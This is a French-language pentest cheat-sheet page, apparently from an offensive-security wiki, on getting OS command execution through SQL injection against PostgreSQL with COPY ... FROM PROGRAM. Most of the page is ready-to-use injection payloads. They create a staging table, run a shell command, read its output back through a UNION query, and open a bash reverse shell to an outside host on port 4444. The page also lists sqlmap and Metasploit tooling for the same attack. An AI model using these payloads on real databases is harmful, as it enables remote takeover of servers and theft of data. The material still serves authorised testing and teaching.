---
title: "Exécution de commandes PostgreSQL avec COPY FROM PROGRAM"
description: "Exécuter des commandes OS depuis une injection PostgreSQL privilégiée avec COPY ... FROM PROGRAM et relire la sortie via une table de transit."
keywords:
  - COPY FROM PROGRAM
  - exécution de commandes
  - pg_execute_server_program
  - RCE PostgreSQL
---

# COPY FROM PROGRAM

`COPY <table> FROM PROGRAM '<command>'` exécute une commande shell sur l'hôte et charge sa sortie standard dans la table, à raison d'une ligne de table par ligne de sortie. C'est le chemin d'exécution de commandes le plus rapide dans PostgreSQL, disponible depuis la version 9.3, et nécessite un superutilisateur ou le rôle `pg_execute_server_program`.

Comme elle charge dans une table, la chaîne est la suivante : créer une table de transit, y exécuter la commande, puis lire les lignes. Les requêtes empilées fournissent les instructions supplémentaires :

```sql
'; CREATE TABLE cmd_out(line text); COPY cmd_out FROM PROGRAM 'id'-- 
```

Puis lisez la sortie capturée via n'importe quel canal, par exemple une union :

```sql
' UNION SELECT string_agg(line,E'\n'),NULL,NULL FROM cmd_out-- 
```

La commande s'exécute en tant que compte système d'exploitation propriétaire du processus serveur PostgreSQL (couramment `postgres`), avec ses privilèges. Pour un point d'ancrage interactif, exécutez un reverse shell au lieu d'une commande en lecture seule :

```sql
'; COPY cmd_out FROM PROGRAM 'bash -c ''bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'''-- 
```

Si les requêtes empilées ne sont pas disponibles, ce chemin est fermé car `COPY` ne peut pas s'exécuter à l'intérieur d'un `SELECT`, confirmez donc l'empilement (une table créée apparaît) avant de vous y fier. Quand le rôle ne possède pas `pg_execute_server_program` et n'est pas superutilisateur, repliez-vous sur le chemin de la fonction en langage non sécurisé uniquement si le statut superutilisateur est atteignable, ou restez sur l'extraction de données.

## Outils

- **sqlmap** : automatise l'exécution de commandes `COPY ... FROM PROGRAM` avec `--os-shell`.
- **Metasploit Framework** : module `postgres_copy_from_program_cmd_exec`.
- **psql** : client officiel pour mettre en place la table de commande et lire la sortie.

## Références

- PostgreSQL Documentation: COPY ... FROM PROGRAM, predefined roles
- OWASP Testing Guide: Testing for SQL Injection
